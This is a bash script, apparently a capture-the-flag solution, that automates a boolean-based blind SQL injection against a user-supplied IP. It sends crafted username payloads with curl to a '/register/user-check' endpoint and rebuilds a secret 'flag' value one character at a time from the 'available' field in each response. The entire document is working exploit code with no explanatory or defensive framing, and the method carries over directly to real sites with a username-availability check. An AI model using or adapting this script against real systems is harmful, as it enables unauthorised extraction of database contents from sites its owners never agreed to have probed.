#!/bin/bash

# Prompt user for target IP
read -p "Enter target IP: " ip

characterlist="ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}:"
flag=""
counter=1

while true; do
    for ((i=0; i<${#characterlist}; i++)); do
        char="${characterlist:$i:1}" # Extract one character

        # Construct the URL-encoded SQL payload
        payload="admin' and (substr((SELECT flag FROM flag LIMIT 0,1),$counter,1)) = '$char';-- -"

        # Send the request using curl (silent mode)
        response=$(curl -s --get --data-urlencode "username=$payload" "http://$ip/register/user-check")

        # Check if 'available": false' exists in the response
        if echo "$response" | grep -q '"available":false'; then
            flag+="$char"
            ((counter++))
            echo "Flag so far: $flag"
            break
        fi
    done
done
